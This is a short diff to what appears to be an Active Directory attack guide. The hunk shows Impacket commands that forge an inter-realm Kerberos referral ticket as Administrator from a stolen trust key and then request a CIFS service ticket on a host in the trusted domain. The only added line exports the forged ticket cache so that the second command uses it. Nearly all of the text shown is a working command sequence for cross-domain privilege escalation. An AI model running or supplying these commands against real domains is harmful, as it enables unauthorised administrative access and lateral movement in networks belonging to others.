@@ -32,6 +32,7 @@ With the trust key, forge an inter-realm referral TGT for the trust, then presen
 # Forge the inter-realm TGT using the trust key, then request a service ticket
 ticketer.py -nthash <trust-key> -domain-sid <SOURCE-domain-SID> \
   -domain source.example.local -spn krbtgt/target.example.local Administrator
+export KRB5CCNAME=Administrator.ccache
 getST.py -k -no-pass -spn cifs/target-host.target.example.local target.example.local/Administrator
 ```
 
